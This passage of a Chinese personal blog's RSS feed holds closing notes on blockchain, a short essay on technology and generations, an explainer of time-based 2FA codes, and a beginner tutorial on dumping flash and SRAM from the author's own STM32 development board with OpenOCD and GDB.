title="http://www.milliondollarhomepage.com">百万格子<i class="fa fa-external-link"></i></span></p><p>这些人不得不服, 实话</p><h3 id="区块链随机数"><a href="#区块链随机数" class="headerlink" title="区块链随机数"></a>区块链随机数</h3><p>区块链上很难产生一个随机数, 如果我们使用POW的X ,<br>RANDAO</p><h3 id="区块链定时问题"><a href="#区块链定时问题" class="headerlink" title="区块链定时问题"></a>区块链定时问题</h3><p>定时任务以太坊网络其实是一个, 是一个状态机, 给了event 然后做出反应, 所有区块链上需要一个合约, 或者DAO<br>Aalarm Clock     现在区块链相当于上世纪的互联网(九十年代)</p><h3 id="着手"><a href="#着手" class="headerlink" title="着手"></a>着手</h3><p>学习以太坊的智能合约的开发<br>把bug说成feature</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这次teahour的内容真是受益匪浅, 通过这篇学习记录越来越坚信, 坚信区块链有一个光芒的未来</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/05/teatime%E8%AF%AD%E5%BD%95/#disqus_thread</comments>
    </item>
    
    <item>
      <title>未来已来</title>
      <link>https://www.diglp.xyz/2018/02/01/%E6%83%B3%E6%83%B3%E6%9C%AA%E6%9D%A5/</link>
      <guid>https://www.diglp.xyz/2018/02/01/%E6%83%B3%E6%83%B3%E6%9C%AA%E6%9D%A5/</guid>
      <pubDate>Wed, 31 Jan 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;偶然间看见了网上的这样一段话。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;任何在我出生时已经有的科技都是稀松平常的世界本来秩序的一部分。&lt;/li&gt;
&lt;li&gt;任何在我15-35岁之间诞生的科技，都是改变世界的革命性产物。&lt;/li&gt;
&lt;li&gt;任何在我35岁之后诞生的科
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>偶然间看见了网上的这样一段话。</p><blockquote><ol><li>任何在我出生时已经有的科技都是稀松平常的世界本来秩序的一部分。</li><li>任何在我15-35岁之间诞生的科技，都是改变世界的革命性产物。</li><li>任何在我35岁之后诞生的科技，都是违反自然规律要遭天谴的。</li></ol></blockquote><p>这段话就是道格拉斯·亚当斯（《银河系漫游指南》作者）令人印象深刻的科技三定律。</p><p>又一次，表弟来到家里玩，拿着一颗弹珠问道：“哥，这个是什么东西啊”，这时候我突然感觉时代这个词，第一次在眼前如此的赫然醒目。笑谈着：“自己真实老了”，但是细细思之。只是诞生在时间轴上t坐标的两个点，其中的差距却是如此的微妙。</p><p>小时候，父亲讲起了自己的童年故事，那时候土地改革。<br>可是那时候的我，显然只是听个故事一样。因为我们的年代，完全没有这些东西的半点的影子呀。</p><p>可是现在慢慢的我很惊奇于一个问题：自己将会如何的和自己的孩子讲述着我们这一代的人的过去呢？。比如，那时候我们用的是安卓手机？或者不能天天迟到自己喜欢的好东西？</p><p>我们的幸福敢可能不是线性增加的东西。</p><p>每每我想起未来，高声的忘我的谈论着，总是有人感觉这是无稽的笑谈。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/01/%E6%83%B3%E6%83%B3%E6%9C%AA%E6%9D%A5/#disqus_thread</comments>
    </item>
    
    <item>
      <title>2FA 双因素认证</title>
      <link>https://www.diglp.xyz/2018/02/01/2FA/</link>
      <guid>https://www.diglp.xyz/2018/02/01/2FA/</guid>
      <pubDate>Wed, 31 Jan 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;登陆在现在的网络生活中是少不了, 登陆的本质就是认证(authentication)&lt;/p&gt;
&lt;p&gt;通过认证, 来证明你是就你,
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>登陆在现在的网络生活中是少不了, 登陆的本质就是认证(authentication)</p><p>通过认证, 来证明你是就你, 不是别人冒充,顶替的(知道密码的委托人除外)</p><p>昨天注册了一个网站, 和正常一样, 账号密码, 可是最后, 有了一项 2FA 绑定, 需要谷歌验证器. 打开后, 一种似曾相识的感觉飘来, 没错,就是很久很久以前的qq令牌,依稀记得这个是S40的jar了.</p><p>小时候就像过, 这个怎么这么神奇, 又不联网,怎么能都知道密码是多少呢.所以,当日常百科,来个所以然 </p><h2 id="2FA的概念"><a href="#2FA的概念" class="headerlink" title="2FA的概念"></a>2FA的概念</h2><p>2FA 是(two-fact authentication)的缩写, 下面是百科的定义</p><blockquote><p>2FA是基于时间、历史长度、实物（信用卡、SMS手机、令牌、指纹）等自然变量结合一定的加密算法组合出一组动态密码，一般每60秒刷新一次。不容易被获取和破解，相对安全。</p></blockquote><p>其实2FA 广义上说是一种认证方法, 比如去银行取钱, 银行卡, 和它的密码都需要,你才能取出钱来, 这个就是一种广义上的2FA.再者也有网上银行的U盾(虽然真的很鸡肋), 也是实现2FA, 它里面有着证书.</p><h2 id="OTP概念"><a href="#OTP概念" class="headerlink" title="OTP概念"></a>OTP概念</h2><p>OTP(one-time password), 一次一密, 如果有点密码学的基础, 就知道一次一密, 理论上是绝对安全的. </p><p>其实在现实生活中, OTP也是存在的比如最常用的短信验证码, 邮箱验证码. 这些都是算的上是一次一密, 只不过,显得不是那么专业. </p><p>(现在我国的短信,还是使用的2G频段的明文SMS, <span class="exturl" data-url="aHR0cDovL2JiLm9zbW9jb20ub3JnL3RyYWMv" title="http://bb.osmocom.org/trac/">GSM嗅探<i class="fa fa-external-link"></i></span>很容易就做到)</p><h3 id="认证器的原理"><a href="#认证器的原理" class="headerlink" title="认证器的原理"></a>认证器的原理</h3><p>使用认证器的时候, 有以下几个步骤</p><ul><li>会从网站上获取一个秘钥. (这样服务器和手机都会有这个串)</li><li>成功导入之后, 会有一个6位的数字, 而且是动态的</li><li>在服务器输入当前的数字,以便验证</li></ul><p>其中基本的原理, 就是这个<code>hash(pri-key, time)</code><br>服务器进行验证</p><pre><code>if(input() == hash(pri-key, time))    ...else    ...</code></pre><h2 id="OTP原理"><a href="#OTP原理" class="headerlink" title="OTP原理"></a>OTP原理</h2><p>上面的伪代码看上去是那么回事, 可是时间虽说是统一变量, 不同设备之间当然会有不同的时间差, 那么如何保证这个问题.</p><p>的确, 这个是时间, 是服务器和客户端直接获取的本地量, 如果直接进行hash, 那么肯定会因为时间细小差别导致认证失败. 我们一般见到, 验证码是有一定的有效时间的, 这个也就是精妙之处的存在</p><p>假定有一个函数<code>gettime()</code>, 可以获得时间戳(unix-timestamp)(1970-1-1)到现在的秒数</p><pre><code>hash_para = gettime() / 30    //这样进行除运算,得到的是到现在有多少个三十秒</code></pre><p>这样,就完美的解决了这个问题, 保证了密码的动态, 和准确</p><p>(设备时间, 不能喝网络时间错的太远…还记得那时候 的qq令牌, 时间不对, 密码不对, 当时差点炸掉)</p><h2 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h2><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这种基于时间的2FA, 算是十分安全的了, 比那一成不变的密码(admin),好上太多了.<br>不过,如果在传输过程中泄漏了pri-key, 那也是完了…</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/01/2FA/#disqus_thread</comments>
    </item>
    
    <item>
      <title>STM32 逆向初步</title>
      <link>https://www.diglp.xyz/2017/11/17/STM32F1x/</link>
      <guid>https://www.diglp.xyz/2017/11/17/STM32F1x/</guid>
      <pubDate>Thu, 16 Nov 2017 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;终于难得闲暇和久违的激情 , 赶紧动手 , 这次也是初步的体验 , 所以目的就是简单的 dump 程序 , 和基本反汇编&lt;/p&gt;
&lt;h2
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>终于难得闲暇和久违的激情 , 赶紧动手 , 这次也是初步的体验 , 所以目的就是简单的 dump 程序 , 和基本反汇编</p><h2 id="工具集介绍"><a href="#工具集介绍" class="headerlink" title="工具集介绍"></a>工具集介绍</h2><h3 id="软件部分"><a href="#软件部分" class="headerlink" title="软件部分"></a>软件部分</h3><ul><li><p>OpenOCD<br>  Open On-Chip Debugger 著名的开源硬件调试器<br>  支持多种的 调试器 (St-link)(jlink) 之类的符合JTAG标准的<br>  支持多种 MPU 调试 只要是主流的都有(这次用到的 STM32F1x 默认有了配置文件)</p><blockquote><p><span class="exturl" data-url="aHR0cDovL29wZW5vY2QuenlsaW4uY29tLw==" title="http://openocd.zylin.com/">http://openocd.zylin.com/<i class="fa fa-external-link"></i></span><br>  这里附上配置文件下载地址可以选择不同的 mpu</p></blockquote></li><li><p>Arm-none-edbi-*<br>  ARM 裸机使用的工具链 (注意是 none 不是 linux)<br>  这里主要提供调试 的 RunTime</p></li><li><p>gdb<br>  GDB, the GNU Project debugger 著名开源调试器<br>  这里用于代替 OCD 的调试 , 毕竟还是专业许多<br>  我们需要的功能虽然 OCD 就可以实现 , 但是使用GDB 还是方便很多</p></li></ul><h3 id="硬件部分"><a href="#硬件部分" class="headerlink" title="硬件部分"></a>硬件部分</h3><p>由于也是初步尝试 , 所以直接找了正点原子的 战舰开发板<br>(我们要使用的就是 JTAG 调试口, 当然开发板已经接好了)</p><ul><li><p>战舰F1开发板 * 1<br>  <img src="http://img.blog.csdn.net/20171117171231646?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="办办办"><br>  采用的 STM32F1X 系列的 MPU  这个型号很重要 , 这个就决定了我们要dump的地址<br>  这样才能 找到flash 和sram 等</p></li><li><p>Jlink * 1<br>  (当然国产寨版)<br>  <img src="http://img.blog.csdn.net/20171117171217647?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="能用就行"><br>  这个就是淘宝货 , 简单暴力 , 久经沙场 , 人手一个 , 纵横江湖</p></li></ul><h2 id="动手"><a href="#动手" class="headerlink" title="动手"></a>动手</h2><h3 id="该接的先都接上-电源-jlink-blah"><a href="#该接的先都接上-电源-jlink-blah" class="headerlink" title="该接的先都接上 (电源 jlink blah..)"></a>该接的先都接上 (电源 jlink blah..)</h3><h3 id="运行OCD"><a href="#运行OCD" class="headerlink" title="运行OCD"></a>运行OCD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openocd -f interface/jlink.cfg -f target/stm32f1x.cfg</span><br></pre></td></tr></table></figure><p>这里的两个 f 是指定的配置文件, 大众器件 所以自带的都有,  要是没有的话就在上面给出的网址下载即可<br>    (这个不是全路径 是相对与 ocd 的安装目录 )</p><p>运行之后 , 效果如图<br><img src="http://img.blog.csdn.net/20171117173304085?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="神奇耶"><br>    这样显示之后 , 说明调试器链接正常 , 且已经进入调试模式</p><h3 id="OCD命令"><a href="#OCD命令" class="headerlink" title="OCD命令"></a>OCD命令</h3><p>OCD在 成功 介入JTAG之后 会返回一个  4444 的 tty控制台 我们直接 telnet上去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet localhost 4444</span><br></pre></td></tr></table></figure><p><img src="http://img.blog.csdn.net/20171117174116753?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="ocd"><br>    这里就会返回一个 OCD 的调试会话<br>    现在已经控制CPU了(help 一大堆 不再赘述)<br>    <strong>由于我们是要对固件进行dump, 所以只要已经运行, 我们把内存, 和flash 的数据抓出来就好了</strong></p><pre><code>halt#执行halt语句 (CPU 暂停)</code></pre><h3 id="GDB-Attach"><a href="#GDB-Attach" class="headerlink" title="GDB Attach"></a>GDB Attach</h3><p>实际上直接使用OCD 可以达到效果, 不过使用GDB 辅助, 使得操作容易方便(可以TAB)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb #先运行GDB</span><br><span class="line">(gdb) target remote localhost:3333</span><br></pre></td></tr></table></figure></p><p><img src="http://img.blog.csdn.net/20171117174842069?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="attach"><br>    执行完后 DGB attach  完成<br>    (现在已经拿到了 CPU 的shell 可以为所欲为了)</p><h3 id="DUMP-重要"><a href="#DUMP-重要" class="headerlink" title="DUMP(重要)"></a>DUMP(重要)</h3><p>终于到了最为核心的一步,就是firmware的dump操作<br>首先我们需要的最重要的 的东西就是内存映射图<br>这个就相当于我们的 地图一样 告诉我们哪里有 什么数据 , 哪里是什么东西<br><strong>(这里就需要查看芯片<a href="www.baidu.com">手册</a>)</strong><br>在手册的第四节 Memory Mapping中<br><img src="http://img.blog.csdn.net/20171117175632250?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="mapping"><br>(图挺大 截取需要部分)<br>我们需要Dump的有 </p><ul><li>Flash (装代码的你说呢)</li><li>SRAM (运行时候产生有趣的东西)</li></ul><p>这样我们查看映射图可以得到信息</p><ul><li>flash的映射地址是 0x08000000 ~ 0x0807ffff (512KB)</li><li>sram的映射地址是 0x20000000 ~ 0x2000ffff (64K)</li></ul><p>所以下面我们在gdb 中 把他们dump出来就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dump  binary memory 32_sram.bin  0x20000000 0x2000ffff</span><br><span class="line">dump  binary memory 32_flash.bin  0x08000000 0x0807ffff</span><br></pre></td></tr></table></figure><p>上述命令就是以二进制形式 Dump 内存 和 flash 的数据出来</p><p><img src="http://img.blog.csdn.net/20171117180454679?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="Dump"></p><p>查看文件 大小就是我们的存储空间<br>到这里 本次 DUMP 完毕</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里 只是逆向的初步,分析才是关键<br>得到 flash 和 sram 数据后 使用 IDA 进行 操作 (这才是逆向)</p><p><img src="http://img.blog.csdn.net/20171117180754767?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQveno3MDkxOTY0ODQ=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2017/11/17/STM32F1x/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
